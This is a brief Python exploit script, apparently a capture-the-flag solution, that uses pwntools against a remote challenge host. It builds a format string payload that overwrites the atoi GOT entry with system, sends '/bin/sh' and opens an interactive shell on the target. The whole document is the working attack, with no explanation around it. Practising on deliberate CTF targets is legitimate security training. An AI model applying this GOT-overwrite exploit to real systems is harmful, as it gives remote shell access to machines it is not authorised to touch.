from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29582)
e = ELF('./pwn')
atoi_got = e.got['atoi']
system_plt = e.plt['system']
payload = fmtstr_payload(10, {atoi_got: system_plt})
io.sendline(payload)
io.sendline(b'/bin/sh\x00')
io.interactive()